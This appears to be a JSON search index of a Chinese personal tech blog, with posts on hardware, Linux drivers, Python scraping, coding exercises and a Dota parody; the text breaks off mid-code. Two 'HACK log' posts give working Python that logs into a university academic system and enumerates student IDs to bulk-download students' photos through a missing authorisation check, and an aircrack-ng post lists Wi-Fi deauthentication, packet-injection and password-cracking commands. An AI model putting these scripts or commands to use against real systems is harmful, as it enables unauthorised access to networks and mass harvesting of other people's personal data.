{"pages":[{"title":"About","text":"","link":"/hexo-blog/about.html"},{"title":"Contact","text":"","link":"/hexo-blog/contact.html"},{"title":"All categories","text":"","link":"/hexo-blog/categories/index.html"},{"title":"All tags","text":"","link":"/hexo-blog/tags/index.html"}],"posts":[{"title":"Gateway ID47H07C 笔记本拆机加内存，图文重播","text":"半个月前新买的笔记本，因内存只有2G，在64bit Windows7下的用户体验不是很好，琢磨了很久，便最终决定亲自为爱机加内存。 今天从某东商城邮购的内存刚到手，便第一时间准备好拆机工具。 拆机准备：螺丝刀一套（十字，一字），内存一条（金士顿 DDR3 1333 4GB），拆机专用刀，小刀（备用）。 拆机前进一下系统，说不定拆坏了就进不去了。 Gateway ID 系列的设计很疼，必须先拆线 C 面键盘（键盘是最难拆的部件，一定要小心，很容易在键盘上留下痕迹。不能使蛮力，否则就要换键盘了。） 拆下键盘后，拧下键盘下的4个螺丝，其中左上部有一螺丝被排线遮挡，很难发现，小心地拧下。 C面拆完，拆D面，一共有六个螺丝。小心地拧下后，用拆机刀别开后盖（此处更需要细心和耐心）。 打开后盖后，笔记本的内脏一览无余。右下角就是内存的位置，因为该本的原2G内存是直接焊到主板上的，所以只能再加一个4G的，即最大6G。 内存特写，准备就位。 将内存槽左右的卡子掰开，将内存推入。 内存安装完毕。 接下来一步一步将零件组装上，装后盖时要一边一边装，让每一个卡子到位。然后把螺丝拧上，这个步骤也一定要小心，不要装完了发现多了一个螺丝。 忐忑地开机，成功一次点亮！ 速度明显快了一些。 内存占用图： Windows 评分 5.4。 360卫视硬件检测。 加内存前360卫视评分。 加内存后360卫视评分。 小结：以前从没有这么大规模地拆过笔记本，经过这次的尝试，确实增长了很多经验值，也为以后更换SSD奠定了基础。总之，技术宅就是要不怕折腾。有问题可以发邮件哦，whypro(at)live.cn。 By whypro Sat, Feb 25, 2012 15:36","link":"/hexo-blog/2012/02/15/Gateway-ID47H07C-%E7%AC%94%E8%AE%B0%E6%9C%AC%E6%8B%86%E6%9C%BA%E5%8A%A0%E5%86%85%E5%AD%98%EF%BC%8C%E5%9B%BE%E6%96%87%E9%87%8D%E6%92%AD/"},{"title":"【边缘检测 v0.7beta】——献给我的大学","text":"边缘检测 v0.7beta 作者：whypro 下载地址：https://sourceforge.net/projects/edgedetection/ 软件功能：利用Canny、Sobel、Laplace算子以及蚁群算法对图像边缘进行检测、识别和提取。 献给我的大学。 By whypro May 30, 2012","link":"/hexo-blog/2012/08/31/%E3%80%90%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B%20v0.7beta%E3%80%91%E2%80%94%E2%80%94%E7%8C%AE%E7%BB%99%E6%88%91%E7%9A%84%E5%A4%A7%E5%AD%A6/"},{"title":"【正方教务管理系统】HACK日志（一）","text":"使用 Wireshark 抓包后得到校正方系统的登陆过程如下： 头信息： 请求头 值 (Request-Line) POST /default2.aspx HTTP/1.1 Host jwc.****.edu.cn:8989 Connection keep-alive Content-Length 156 Cache-Control max-age=0 Origin http://jwc.****.edu.cn:8989 User-Agent Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5 Content-Type application/x-www-form-urlencoded Accept text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Referer http://jwc.****.edu.cn:8989/ Accept-Encoding gzip,deflate,sdch Accept-Language zh-CN,zh;q=0.8 Accept-Charset GBK,utf-8;q=0.7,*;q=0.3 Cookie ASP.NET_SessionId=mrctyyikxevfky55cerpjx45 发送的数据： 参数名 值 __VIEWSTATE dDwtMTIwMTU3OTE3Nzs7PpxRSEGelcLnTaPgA3v56uoKweD+ TextBox1 ********** TextBox2 ********** RadioButtonList1 学生 Button1 lbLanguage 查询过程如下： 头信息： 请求头 值 (Request-Line) GET /readimagexs.aspx?xh=********** HTTP/1.1 Host jwc.****.edu.cn:8989 Connection keep-alive User-Agent Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5 Accept text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Encoding gzip,deflate,sdch Accept-Language zh-CN,zh;q=0.8 Accept-Charset GBK,utf-8;q=0.7,*;q=0.3 Cookie ASP.NET_SessionId=mrctyyikxevfky55cerpjx45 查询字符串 参数名 值 xh ********** 整个登陆过程已经很明朗了，明天将用Python实现。 2012-06-30By whypro","link":"/hexo-blog/2012/06/30/%E3%80%90%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E3%80%91HACK%E6%97%A5%E5%BF%97%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"【正方教务管理系统】HACK日志（二）","text":"正方系统的一个漏洞是获取学生图片时没有对学生身份进行检测。理论上来说，获取学生李四的照片，需要首先判断登陆者身份是教师或者学生，如果是学生还要判断登陆者是否为李四本人，而正方系统在这一方面并没有做得很好，导致张三可以轻松地获取李四的照片。 下面是笔者编写的一个简单的爬虫程序，Python 代码如下（Python 3.2）， 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import http.clientimport urllibimport os_xh = '**********'_pw = '**********'VIEWSTATE = 'dDwtMTIwMTU3OTE3Nzs7PpxRSEGelcLnTaPgA3v56uoKweD+'host = 'jwc.****.edu.cn:8989'main_url = 'http://' + hostlogin_page = '/default2.aspx'login_url = main_url + login_pagereadimage_page = '/readimagexs.aspx'print(main_url)print(login_url)conn = http.client.HTTPConnection(host)login_post_data = urllib.parse.urlencode({ '__VIEWSTATE': VIEWSTATE, 'TextBox1': _xh, 'TextBox2': _pw, 'RadioButtonList1': '学生', 'Button1': '', 'lbLanguage': ''})login_post_data = login_post_data.encode('utf-8')login_headers = { 'Host': host, 'Connection': 'keep-alive', 'Origin': main_url, 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': main_url, 'Accept-Encoding': 'gzip,deflate,sdch', 'Accept-Language': 'zh-CN,zh;q=0.8', 'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3'}conn.request('POST', login_page, body = login_post_data, headers = login_headers)result = conn.getresponse()print(result.status)#print(result.read())cookie = result.msg['set-cookie'].split(';')[0]#print(cookie)conn.close()readimage_headers = { 'Host': host, 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'Accept-Language': 'zh-CN,zh;q=0.8', 'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3', 'Cookie': cookie}conn.request('GET', '/xs_main.aspx' + '?' + 'xh=' + _xh, headers = readimage_headers)#result = conn.getresponse()#print(result.status)#print(result.read())conn.close()for year in range(1, 12):#11 for college in range(1, 20):#19 for major in range(1, 15):#14 for mclass in range(1, 10): for series in range(1, 50): image_xh = &quot;%02d%02d%02d%02d%02d&quot; % (year, college, major, mclass, series) readimage_url = readimage_page + '?' + 'xh=' + image_xh print(readimage_url) conn.request('GET', readimage_url, headers = readimage_headers) result = conn.getresponse() #print(result.status) image = result.read() if len(image) &gt; 1024: save_path = os.path.join(os.path.abspath('./pic/'), image_xh + '.bmp') print(save_path) fp = open(save_path, 'wb') fp.write(image) fp.close() else: print('skip')print('done')conn.close() 后记：正方的选课模块依然有这样的漏洞，因此理论上来说，偷窥别人的课程、暴力选课也照样可以实现。 2012-07-01By whypro","link":"/hexo-blog/2012/07/01/%E3%80%90%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E3%80%91HACK%E6%97%A5%E5%BF%97%EF%BC%88%E4%BA%8C%EF%BC%89/"},{"title":"Fedora 17 安装无线网卡驱动","text":"1. 首先添加 RPM Fusion 源 一般情况下，Fedora 17 自带的软件源并不能满足我们的需求，有时在官方软件源搜索不到的软件，在 RPM Fusion 上往往可以搜索到（尤其是第三方软件与驱动）。因此，我们首先将 RPM Fusion 源添加到系统上： 参见：http://rpmfusion.org/Configuration，我们在终端中输入（针对于 Fedora 17）： 1su -c 'yum localinstall --nogpgcheck http://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-stable.noarch.rpm http://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-stable.noarch.rpm' 2. 安装 kmod-wl 软件包 添加了上面的软件源，我们就可以运行下面命令搜索第三方驱动包： 1yum search kmod-wl 接下来会显示一大坨 kmod-wl，分别对应不同的 Kernel 版本。 要知道本机的 Kernel 版本，运行： 1uname -r 在 serach 返回的结果中找到与之对应的 kmod-wl 版本，运行： 1sudo yum install kmod-wl-{对应版本号} 重启计算机 注意： 1. 机器需要能上网（有线） 2. 需要管理员权限，如果用户不再管理员组需要先将其加入管理员组；或者使用 su 命令切换到 root 账户再操作。 3. kmod-wl 驱动包并不能保证支持所有的网卡型号，所以最重要的一点是要看人品，关于如何增加人品，请访问【这里】。","link":"/hexo-blog/2012/09/30/Fedora-17-%E5%AE%89%E8%A3%85%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E9%A9%B1%E5%8A%A8/"},{"title":"aircrack-ng 使用笔记","text":"1. airmon-ng：激活网卡监听 1airmon-ng start wlan0 2. airodump-ng：捕获802.11数据报文，以便于破解 无参数启动 airodump-ng 可查看所有接收范围内的AP、Client信息 1airodump-ng \\[-w filename\\] \\[-c channel\\] mon0 其中，-w 后的参数为保存的文件名，-c 后的参数为频段 3. aireplay-ng：根据需要创建特殊的无线网络数据报文 aireplay-ng -9：注入攻击链路质量测试 WEP: aireplay-ng -1：伪认证联机请求攻击 伪认证联机请求并发送保持在线数据 1aireplay-ng -1 6000 -o 1 -q 10 -e (bssid) -a (AP Mac) -h (Host Mac) mon0 aireplay-ng -3：ARP 攻击 监听 ARP 报文，一旦出现就不断将该报文重发，使目标机器产生实际回应数据，发回更多IV数据。 对于无机器连接的 WEP： aireplay-ng -5：Fragmenation 攻击 监听一个 AP 广播出来的数据包，并抽离有效的伪随机数据(PRGA)，保存到 fragment-XXXX-XXXXX.xor 文件供下一步使用。 有时监听到的不是广播包，转发攻击后 AP 没有回应，一系列重试后程序会重新监听；有时候可能需要不少时间，加 –F 参数可以自动应答。 aireplay-ng -4：chopchop 攻击 上述攻击不奏效可试，相同作用。 WPA/WPA2: aireplay-ng -0：Deauthentication 攻击 往已经连接到 AP 的一个客户端伪造一个离线包，使其离线重连以便捕捉 handshake。注意要收到 ACK，才表明被攻击客户端收到，才会下线；发送离线不宜过密过多。 4. aircrack-ng：暴力破解 1aircrack-ng \\[-w dictionary\\] *.cap 暴力破解。其中，-w 参数为密码字典，破解的成功率取决于字典的覆盖程度以及机器的速度。","link":"/hexo-blog/2012/10/10/aircrack-ng-%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"},{"title":"我是火枪，我想打 DPS","text":"我把简历递给考官时，感到自己的白胡子因为紧张而微微发抖。跟其他毕业生一样，我需要一份工作。 “矮人狙击手。通过使用熟练的射击技术和我信赖的火枪，我能对远处的敌人实施系统的破坏。通过对最容易遭受攻击的区域的细致瞄准，我能够对敌人造成严重的伤害，只需要一 小段时间，我就可以用人们所熟知的那种方法（狙击）来除掉一个对手。我的火枪配有第2弹管，可以用来发射榴散弹，在近处的区域造成大量伤害。”面试官慢慢读着简历上我的自我简介，道，“这么说来，你是来应聘DPS的？”我点头。“你的特长是什么？”考官问。“我是远程，我是敏捷英雄，我是远程。我是后期。我够猥琐。”“猥琐？”考官不解，”这是优点？”“就是前期很会提防gank。”我解释道。“这样啊。你有留人技能吗。”“我的爆头可以打断别人TP。45%概率0.01秒晕眩。”我说。“像我们公司的虚空假面和鱼人守卫可以晕住别人1到2秒。你这个有点不够达标。”考官说。“如果公司需要，我可以出碎骨锤。”我说。“你有保命技能吗。”“保住性命的最好办法就是在别人杀你之前你依靠意识和走位还有操作反杀之。”我说。“我问你有保命技能吗。有还是没有？”“呃，没有。”“我们公司的dps一般都要求有逃生技能。譬如虚空假面和敌法师的闪烁，骷髅王的重生什么的。”“如果公司需要，我可以出洛萨之锋。”我说。“你团战作用怎么样。”考官问。“我的弹幕可以减速，顺带dot伤害。”我说。“不能群晕么。”考官说。“应该不能吧。”“你的弹幕有给团队带来的增益吗？”“呃。没有。”“我们公司暗牧的大招团战时候可以给我们加护甲，给对面减甲。”“如果公司需要，我可以出梅肯。”我摸摸额头上的汗。“你够肉吗。”“呃，我的职责更应该是全力输出。”“站不住的DPS连尸体都不如，你听说过这句话吗，年轻人？”“如果公司需要，我可以出先锋盾和跳刀，团战第一时间切入，吸收伤害和技能。”我说。“嗯。你的薪酬要求是多少？”“20分钟前可以有出假腿的钱。”我不敢多说。“工作待遇要求呢？”“我只要野区的狗头人一家作为最低保障。”“年轻人，”考官这时说道，“我们考察了一下，你是一名有志于做dps的人。但是你的祖籍是近卫，怎么会想到来我们天灾集团求职呢.”“我爸妈手速慢，生我的时候没有抢到近卫5楼。所以我的户口算是天灾的。”我说。“你要知道，我们公司是本地生源优先的哦。”考官说。“我懂。但我可以待遇比本地户口的天灾人员低一些。只要贵公司给我打dps的机会。”我说。“我们会好好考虑的。你可以回去了，等我们的通知。” 离开冰封王座的时候，我还是不由打了个冷战。我急需这份工作。但我的竞争者很强。即便我幸运地被录用了，也得比别人做更高强度的工作。我要打钱快，前期压人，中期gank，后期超神。我要在团战的时候吸收伤害，然后先手控制住对面的C，秒掉法师，收割dps。我还要用梅肯给队友加血，包鸡包眼包雾，让野，拆眼。等等，这还是原来的我么？上大学的时候，系主任说后期dps系是最吃香的，是天之骄子。四年以后，6.5x变成了6.7x，形势大变，环境已经不容许我们后期闲云野鹤了。像我这种没有什么保命或者控制技能的dps，找工作是最难的。 我真羡慕那个高帅富的骷髅王，有锤子，有吸血，带暴击，还有两条命。周末的时候他和冰女去开f了。而我只有对着冰女的照片摸摸撸着。我也羡慕那个飘逸的影魔和蓝猫，国际企业展览会上总有他们的身影。我甚至羡慕VS，这小黑妹学的家政管理，包鸡包眼还要gank和换人，累是累了，但是好歹有份工作，混口饭吃。对了，冰女学的也是这个专业，因为有个回魔光环，俨然成了援gj一颗新星了。 想着想着，我不由叹了一口气，掏出最后一根艾西菲的远古祭祀，点着了一棵树，默默抽着。我可不像影魔他们，可以经常喝100大元一瓶的药膏。我看到不远处，同班的小黑在低声啜泣。看来是面试遭拒了吧。她虽说射手天赋好，还有冰箭减速，可惜一个姑娘家身板太脆，再加上出身黑暗，尽管是正宗近卫户口，也难以找到工作。唉。同是天涯沦落人呐。我走过去想安慰她。她抬头看我，道，你谁呀，矮矬穷？我是火枪，我想打dps。","link":"/hexo-blog/2012/10/16/%E6%88%91%E6%98%AF%E7%81%AB%E6%9E%AA%EF%BC%8C%E6%88%91%E6%83%B3%E6%89%93-DPS/"},{"title":"找出字符串中第一个只出现一次的字符","text":"昨天参加了一次笔试，最后一道题是这样的：找出一个纯字母字符串中第一个只出现一次的字符。 我的思路是这样的，假设该字符串是由纯小写字母组成，则可以定义一个布尔数组，该数组保存每个字符出现次数是否大于 1 的状态。接着遍历字符串，同时利用 ASCII 码对应到布尔数组，判断状态即可。鄙人的 C++ 代码如下： 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;cassert&gt;using namespace std;char FirstAppearOnce(char* str) { bool moreThanOnce[26] = {false}; for (char* p = str; *p != '\\0'; ++p) { assert((*p &gt;= 'a') &amp;&amp; (*p &lt;= 'z')); char* q; for (q = p + 1; !moreThanOnce[*p - 'a'] &amp;&amp; (*q != '\\0'); ++q) { if (*q == *p) { moreThanOnce[*p - 'a'] = true; break; } } if (*q == '\\0') { return *p; } } return 0;}int main() { char* str = &quot;thisisateststring&quot;; cout &lt;&lt; FirstAppearOnce(str) &lt;&lt; endl; system(&quot;pause&quot;); return 0;} 如果存在大小 写、符号等情况，则可以为 整个 ASCII 字符创建一个布尔数组（ASCII 有 128 个字符，因此数组可改为 128 个元素 ） 。对上面代码稍稍修改一下，便可以支持所有字符： 1234567891011121314151617181920212223242526#include &lt;iostream&gt;using namespace std;char FirstAppearOnce(char* str) { bool moreThanOnce[128] = {false}; for (char* p = str; *p != '\\0'; ++p) { char* q; for (q = p + 1; !moreThanOnce[*p] &amp;&amp; (*q != '\\0'); ++q) { if (*q == *p) { moreThanOnce[*p] = true; break; } } if (*q == '\\0') { return *p; } } return 0;}int main() { char* str = &quot;This is a test string.&quot;; cout &lt;&lt; FirstAppearOnce(str) &lt;&lt; endl; system(&quot;pause&quot;); return 0;} 欢迎拍砖。","link":"/hexo-blog/2012/10/19/%E6%89%BE%E5%87%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E5%AD%97%E7%AC%A6/"},{"title":"BeautifulSoup3 编码问题总结","text":"关于 BeautifulSoup3 对 gb2312 编码的网页解析的乱码问题，【这篇文章】提出了一个勉强能用的解决方法。即如果中文页面编码是 gb2312，gbk，在 BeautifulSoup 构造器中传入 fromEncoding=&quot;gb18030&quot; 参数即可解决乱码问题，即使分析的页面是 utf8 的页面使用 gb18030 也不会出现乱码问题！如： 1234567from urllib2 import urlopenfrom BeautifulSoup import BeautifulSouppage = urllib2.urlopen('http://www.baidu.com');soup = BeautifulSoup(page,fromEncoding=&quot;gb18030&quot;)print soup.originalEncoding 为什么网页是 utf8 传入 gb18030 依然能够正常解析呢？ 这是由于，BeautifulSoup 的编码检测顺序为： 创建 Soup 对象时传递的 fromEncoding 参数； XML/HTML 文件自己定义的编码； 文件开始几个字节所表示的编码特征，此时能判断的编码只可能是以下编码之一：UTF-#，EBCDIC 和 ASCII； 如果你安装了 chardet，BeautifulSoup 就会用 chardet 检测文件编码； UTF-8； Windows-1252。 因此，当传入 fromEncoding=&quot;gb18030&quot; 编码参数与 html 文件编码不匹配时，BeautifulSoup 并不会抛出异常，而是按照预定义的编码检测顺序，按照 utf8 来解析，因此也可以勉强得到正确结果！","link":"/hexo-blog/2013/03/28/BeautifulSoup3-%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"},{"title":"Chrome 浏览器强制使用 https 传输","text":"在日常工作和生活中，一些网站的访问很容易受到“不可抗拒因素”的影响，这大多都是因为 http 请求是明文传输，这样很容易受到某些防火墙的干扰，比如“101 CONNECT_RESET”。而 Chrome 强制使用 https 协议访问这些站点一般来说可以解决此问题，设置方法如下： 在 Chrome 地址栏输入 chrome://net-internals/#hsts ，如图，在 Domain（域名）中输入地址，如 google.com 或 facebook.com，选中 Include subdomains（包含子域名），点击 Add（添加）。 再访问这些站点，就会发现强制使用 https 了。","link":"/hexo-blog/2013/03/29/Chrome-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BC%BA%E5%88%B6%E4%BD%BF%E7%94%A8-https-%E4%BC%A0%E8%BE%93/"},{"title":"利用 Python 实现抓图程序","text":"这些天除了忙交大的复试，还一直忙于用 Python 编写抓图程序。好在前几天收到了短信，心总算放了下来，毕竟这一年在思过崖的面壁得到了回报。然而，在西安找实习工作时却处处碰壁，我想说考官大姐们你们可不能以貌取人啊，凭什么他比我帅你们就招他了……算了，不说了，男儿有泪不轻弹，只是未到桑心处。 程序的功能基本已经实现，可是原先仅仅考虑到抓一个网站的图片，当换一个网站，却又得重新编写 HTML 解析代码，好不麻烦。所以，便想着利用设计模式重构代码，使其可应用与大多数图片网站，甚至应用于视频网站。_因为程序仍处于开发期，所以在此我并不能透漏具体要抓取的页面地址，实在抱歉。_下面我们来看看该程序具体如何实现： 一、ImageLister 类首先，我设计了一个 ImageLister 类，主要负责解析 HTML 页面（依赖于 BeautifulSoup3），返回图片 URL，当页面有分页时，自动检测分页，顺序分析所有分页。类设计如图 1。 图 1 ImageLister 类的实现代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# imagelister.py# -*- coding: utf-8 -*-from BeautifulSoup import BeautifulSoupfrom urlparse import urljoinfrom re import subfrom ulib import uopen, ucloseclass ImageLister(object): def __init__(self, first_page): self.first_page = first_page self.title = &quot;&quot; self.info = &quot;&quot; self.pages = [] self.images = [] def getFirstPage(self): return self.first_page def getPages(self): return self.pages def getImages(self): self.images = self.anlzAllImageUrls() return self.images def getTitle(self): return self.title def getInfo(self): return self.info def getHtmlSrc(self, url): u = uopen(url) src = u.read() uclose(u) return src # 分析页面标题 def anlzTitle(self, data): soup = BeautifulSoup(data, fromEncoding=&quot;gb18030&quot;) title = soup.html.head.title.string.strip() return title def anlzAllPageUrls(self): pass def anlzAllImageUrls(self): pass ImageListerA 类的实现代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# imagelistera.py# -*- coding: utf-8 -*-from imagelister import *class ImageListerA(ImageLister): def __init__(self, first_page): super(ImageListerA, self).__init__(first_page) data = self.getHtmlSrc(first_page) self.title = self.anlzTitle(data) self.info = self.anlzInfo(data) self.pages = self.anlzAllPageUrls(data, first_page) # 分析页面简介 # 该函数实现部分不必深究，具有页面特异性 def anlzInfo(self, data): soup = BeautifulSoup(data, fromEncoding=&quot;gb18030&quot;) comment = soup.find(&quot;div&quot;, {&quot;class&quot;: &quot;comment2&quot;}) info = comment.find(&quot;span&quot;, {&quot;class&quot;: &quot;i_user&quot;}).string info += &quot;\\n&quot; contents = comment.find(&quot;font&quot;, {&quot;color&quot;: &quot;#999999&quot;}).contents for content in contents: temp_con = content.strip() info += sub(r&quot;&lt;br(\\s*\\/)?&gt;&quot;, &quot;\\n&quot;, temp_con) return info # 分析得到所有分页页面链接 # 该函数实现部分不必深究，具有页面特异性 def anlzAllPageUrls(self, data, first_page): soup = BeautifulSoup(data, fromEncoding=&quot;gb18030&quot;) pagination = soup.find(&quot;div&quot;, {&quot;id&quot;: &quot;pagination&quot;}) alinks = pagination.findAll(&quot;a&quot;)[1:-3] pages = [] pages.append(first_page) for alink in alinks: page = urljoin(first_page, alink[&quot;href&quot;]) pages.append(page) return pages # 分析所有分页得到所有图片链接 # 该函数实现部分不必深究，具有页面特异性 def anlzAllImageUrls(self): pages = self.pages images = [] for page in pages: u = uopen(page) data = u.read() soup = BeautifulSoup(data, fromEncoding=&quot;gb18030&quot;) imglinks = soup.findAll(&quot;img&quot;, {&quot;class&quot;: &quot;IMG_show&quot;}) for imglink in imglinks: image = imglink[&quot;src&quot;] images.append(image) return images# 单元测试 onlyif __name__ == &quot;__main__&quot;: lister = ImageListerA(&quot;**************************************.htm&quot;) print lister.getTitle() print lister.getInfo() print lister.getPages() print &quot;\\n&quot;.join(lister.getImages()) 同样地，ImageListerB 根据抓取网页的不同，而重写 ImageLister 中的方法，这样，换一个网站，只需要新创建一个继承于 ImageLister 的 ImageListerXXX 类，实现适合于该网站的 HTML 解析算法即可。 其中，ulib.py 是我自己写的库，提供了带重试功能的 url 访问函数以及其他的一些常用的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# -*- coding: utf-8 -*-# ulib.pyfrom urllib2 import urlopen, HTTPError, URLErrorfrom time import sleepdef uopen(url, verbose=True): retryTimes = 5 sleepTime = 10 while retryTimes &gt; 0: try: if verbose: print u&quot;正在读取：&quot;, url u = urlopen(url) # 读取成功 if u.code == 200: return u elif u.code == 201: break except HTTPError, e: print e if e.code == 404: break except URLError, e: print e except BaseException, e: print e retryTimes -= 1 if verbose: print u&quot;读取失败，等待重试……&quot; sleep(sleepTime) return Nonedef uclose(u): u.close()# 格式化文件大小# 如 10 =&gt; &quot;10B&quot;, 1024 =&gt; &quot;1KB&quot;...def formatSize(size): if size &gt; pow(1024, 2): new_size = size / pow(1024, 2) postfix = &quot;MB&quot; elif size &gt; 1024: new_size = size / 1024 postfix = &quot;KB&quot; else: new_size = size postfix = &quot;B&quot; strsize = &quot;%.2f&quot; % new_size return strsize + postfix 二、ImageCatcher 类ImageCatcher 类主要负责从 ImageLister 类得到图片 url，再将其存入本地（dirname = save_path + title），同时保存页面的地址（first_page）、标题（title）以及备注信息（info）。 ImageCatcher 类的实现代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175# -*- coding: utf-8 -*-# imagecatcher.pyimport osfrom time import clockimport urlparsefrom imagelistera import ImageListerAfrom ulib import uopen, uclose, formatSizeIMAGE_URL_FILE = &quot;image_urls.txt&quot;IMAGE_INFO_FILE = &quot;image_info.txt&quot;class ImageCatcher(object): def __init__(self, save_path, image_lister): self.image_lister = image_lister self.save_path = save_path self.first_page = image_lister.getFirstPage() self.title = image_lister.getTitle() self.info = image_lister.getInfo() self.dirname = os.path.join(save_path, self.title); self.__createDir(self.dirname, verbose=False) #print self.first_page print self.title #print self.info #print self.dirname self.downAllImages() # 创建图片文件夹 def __createDir(self, dirname, verbose=True): if not os.path.exists(dirname): os.makedirs(dirname) if verbose: print u&quot;已创建：%s&quot; % dirname return True else: if verbose: print u&quot;已存在：%s&quot; % dirname return False # 下载所有图片 def downAllImages(self, verbose=True): filename = os.path.join(self.dirname, IMAGE_URL_FILE) # 通过文件静态获取 if os.path.exists(filename): if verbose: print u&quot;已存在：%s&quot; % filename images = self.__readImageUrls(filename, verbose) # 远程读取 url，并保存至文件 else: images = self.__saveImageUrls(filename, verbose) self.images = images imageNum = len(images) i = 0 for image in images: i += 1 if verbose: print &quot;%d/%d&quot; % (i, imageNum) print image self.__saveImage(image) # 保存信息文件 filename = os.path.join(self.dirname, IMAGE_INFO_FILE) self.__saveInfo(filename, verbose) # 通过文件静态获取图片 URL def __readImageUrls(self, filename, verbose=True): f = open(filename, &quot;r&quot;) images = [] for line in f: images.append(line.rstrip(&quot;\\n&quot;)) f.close() if verbose: print u&quot;搜索到：%d 张&quot; % len(images) return images # 远程读取图片 URL，并保存至文件 def __saveImageUrls(self, filename, verbose=True): images = self.image_lister.getImages() if verbose: print u&quot;搜索到：%d 张&quot; % len(images) f = open(filename, &quot;w&quot;) for image in images: f.write(image) f.write(&quot;\\n&quot;) f.close() if verbose: print u&quot;已写入：%s&quot; % filename return images def __saveImage(self, url, verbose=True): basename = url.split(&quot;/&quot;)[-1] dirname = self.dirname assert(os.path.exists(dirname)) filename = os.path.join(dirname, basename) file_size = 0 if os.path.exists(filename): print u&quot;文件已存在：%s&quot; % filename else: u = uopen(url) if u is None: return block_size = 8192 downloaded_size = 0 length = u.info().getheaders(&quot;Content-Length&quot;) if length: file_size = int(length[0]) print u&quot;文件大小：%s&quot; % formatSize(file_size) f = open(filename, &quot;wb&quot;) print u&quot;正在下载：%s&quot; % url start = clock() try: while True: buffer = u.read(block_size) if not buffer: # EOF break downloaded_size += len(buffer); f.write(buffer) # 显示下载进度 if file_size: print &quot;%2.1f%%\\r&quot; % (float(downloaded_size * 100) / file_size), else: print '...' except BaseException, e: print e f.close() if os.path.exists(filename): os.remove(filename) print u&quot;已删除损坏的文件：%s&quot;, filename exit() finally: uclose(u) f.close() print u&quot;文件已保存：%s&quot; % os.path.abspath(filename) end = clock() spend = end - start print u&quot;耗时：%.2f 秒&quot; % spend print u&quot;平均速度：%.2fKB/s&quot; % (float(file_size) / 1024 / spend) # 保存信息文件 # 文件包括：url, title, info def __saveInfo(self, filename, verbose=True): if not os.path.exists(filename): info = self.image_lister.getInfo() f = open(filename, &quot;w&quot;) f.write(self.first_page) f.write(&quot;\\n&quot;) # 注意此处以将 Unicode 转换为 UTF-8 保存 if self.title: f.write(self.title.encode(&quot;utf-8&quot;)) f.write(&quot;\\n&quot;) if self.info: f.write(self.info.encode(&quot;utf-8&quot;)) f.write(&quot;\\n&quot;) if verbose: print u&quot;已写入：%s&quot; % filename return True else: if verbose: print u&quot;已存在：%s&quot; % filename return False # 单元测试 onlyif __name__ == &quot;__main__&quot;: lister = ImageListerA(&quot;http://*************************************.htm&quot;) #lister = ImageListerB(&quot;http://*************************************.htm&quot;) ImageCatcher(&quot;pics&quot;, lister) # &quot;pics&quot; 为相对路径 三、ulib 库ulib 是我自己实现 URL 处理库（多谢 ouats 的提醒），代码实现如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485# -*- coding: utf-8 -*-import urllib2from urllib2 import Request, urlopen, HTTPError, URLErrorfrom time import sleepimport socketRETRY_TIMES = 5SLEEP_TIME = 10def uopen(url, headers={}, timeout=None, verbose=True): retryTimes = RETRY_TIMES sleepTime = SLEEP_TIME if headers: try: r = Request(url, headers=headers) u = urlopen(r) except HTTPError, e: print e print u&quot;服务器已禁止断点续传&quot; else: return u while retryTimes &gt; 0: try: u = urlopen(url) if verbose: print u&quot;正在连接：&quot;, url # 连接成功 if u.code == 200: return u elif u.code == 201: break except HTTPError, e: print e if e.code == 404: break except URLError, e: print e except socket.timeout, e: print u&quot;连接超时，等待重试……&quot; except KeyboardInterrupt, e: print u&quot;用户强制中止&quot; exit() except BaseException, e: print e retryTimes -= 1 #if verbose: # print u&quot;读取失败，等待重试……&quot; try: # 少量多次，见机中止 while sleepTime &gt; 0: sleep(1) sleepTime 